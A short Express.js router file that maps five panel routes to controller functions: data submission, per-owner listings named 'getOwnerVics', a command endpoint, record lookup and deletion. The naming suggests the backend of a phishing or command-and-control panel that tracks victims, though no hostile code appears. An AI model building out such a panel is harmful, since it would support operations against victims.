const express = require("express");
const {
	getOwnerVics,
	command,
	deleteEntry,
	getInfo,
	submitData,
} = require("../controllers/panelController");
const router = express.Router();

router.post("/data", submitData);
router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/delete", deleteEntry);

module.exports = router;
